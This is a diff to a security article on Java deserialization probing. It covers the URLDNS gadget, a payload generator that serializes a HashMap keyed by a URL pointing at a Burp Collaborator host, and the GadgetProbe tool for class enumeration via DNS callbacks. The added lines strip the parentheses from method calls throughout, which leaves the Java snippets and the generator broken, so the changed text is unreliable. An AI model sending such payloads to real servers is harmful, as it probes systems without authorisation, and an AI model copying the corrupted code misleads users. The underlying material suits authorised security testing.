@@ -9,9 +9,9 @@ The `java.net.URL` class implements `Serializable`, so instances can be included
 public final class URL implements java.io.Serializable {
 ```
 
-`URL` has a useful side effect for detection: host comparison may require name resolution, and both `equals()` and `hashCode()` are documented as potentially blocking operations. A lookup is not guaranteed on every invocation because the URL object and the resolver can cache results, but a deliberately prepared object can make deserialization perform a DNS lookup.<sup>[[1]](#references)[[5]](#references)</sup>
+`URL` has a useful side effect for detection: host comparison may require name resolution, and both `equals` and `hashCode` are documented as potentially blocking operations. A lookup is not guaranteed on every invocation because the URL object and the resolver can cache results, but a deliberately prepared object can make deserialization perform a DNS lookup.<sup>[[1]](#references)[[5]](#references)</sup>
 
-One way to reach `URL.hashCode()` is to use the URL as a `HashMap` key. While reconstructing a serialized map, `HashMap.readObject()` hashes each key:
+One way to reach `URL.hashCode` is to use the URL as a `HashMap` key. While reconstructing a serialized map, `HashMap.readObject` hashes each key:
 
 ```java
 private void readObject(java.io.ObjectInputStream s)
@@ -23,21 +23,21 @@ private void readObject(java.io.ObjectInputStream s)
     }
 ```
 
-The relevant call is `hash(key)`, whose implementation invokes the key's `hashCode()` method:
+The relevant call is `hash(key)`, whose implementation invokes the key's `hashCode` method:
 
 ```java
 static final int hash(Object key) {
     int h;
-    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
+    return (key == null) ? 0 : (h = key.hashCode) ^ (h >>> 16);
 }
 ```
 
-Consequently, deserializing a `HashMap` containing a URL key can execute `URL.hashCode()`.
+Consequently, deserializing a `HashMap` containing a URL key can execute `URL.hashCode`.
 
-The relevant part of `URL.hashCode()` is:
+The relevant part of `URL.hashCode` is:
 
 ```java
- public synchronized int hashCode() {
+ public synchronized int hashCode {
         if (hashCode != -1)
             return hashCode;
 
@@ -52,9 +52,9 @@ When the cached value is `-1`, the method delegates to the URL stream handler. T
         int h = 0;
 
         // Generate the protocol part.
-        String protocol = u.getProtocol();
+        String protocol = u.getProtocol;
         if (protocol != null)
-            h += protocol.hashCode();
+            h += protocol.hashCode;
 
         // Generate the host part.
         InetAddress addr = getHostAddress(u);
@@ -90,27 +90,27 @@ public class URLDNS {
         File f = new File(file);
         ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
         out.writeObject(instance);
-        out.flush();
-        out.close();
+        out.flush;
+        out.close;
     }
 	public static void payloadTest(String file) throws Exception {
         //Read the written payload and deserialize it
         ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
-        Object obj = in.readObject();
+        Object obj = in.readObject;
         System.out.println(obj);
-        in.close();
+        in.close;
     }
 
 	public static void main(final String[] args) throws Exception {
 		String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
-		HashMap<URL, String> ht = new HashMap<>(); // HashMap that will contain the URL
-		URLStreamHandler handler = new SilentURLStreamHandler();
+		HashMap<URL, String> ht = new HashMap<>; // HashMap that will contain the URL
+		URLStreamHandler handler = new SilentURLStreamHandler;
     URL u = new URL(null, url, handler); // URL to use as the Key
     ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
 
     // During the put above, the URL's hashCode is calculated and cached.
     // This resets that so the next time hashCode is called a DNS lookup will be triggered.
-    final Field field = u.getClass().getDeclaredField("hashCode");
+    final Field field = u.getClass.getDeclaredField("hashCode");
     field.setAccessible(true);
 		field.set(u, -1);
 
@@ -144,7 +144,7 @@ You can download [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe) fro
 
 **GadgetProbe** combines the DNS signal from the previous section with a probe for an arbitrary class. A callback is evidence that the target resolved the tested class before reaching the URLDNS key. No callback is ambiguous: the class may be absent, but DNS egress controls, caching, serialization filters, incompatible class metadata, or application behavior can also suppress the signal. Confirm findings with more than one controlled probe.
 
-Internally, the tool uses Javassist to create an empty local class with the requested fully qualified name and serializes its `Class` object before a URL key in a `LinkedHashMap`. The insertion order is the oracle: if the receiver cannot resolve the candidate descriptor, deserialization stops before the URL is read; if resolution succeeds, map reconstruction reaches `URL.hashCode()` and the class name appears in the callback hostname. Therefore, this tests **class resolution/loadability**, not whether that class is itself `Serializable` or whether it forms a complete exploitable chain.<sup>[[3]](#references)</sup>
+Internally, the tool uses Javassist to create an empty local class with the requested fully qualified name and serializes its `Class` object before a URL key in a `LinkedHashMap`. The insertion order is the oracle: if the receiver cannot resolve the candidate descriptor, deserialization stops before the URL is read; if resolution succeeds, map reconstruction reaches `URL.hashCode` and the class name appears in the callback hostname. Therefore, this tests **class resolution/loadability**, not whether that class is itself `Serializable` or whether it forms a complete exploitable chain.<sup>[[3]](#references)</sup>
 
 The repository includes [wordlists](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) of Java classes to test.
 
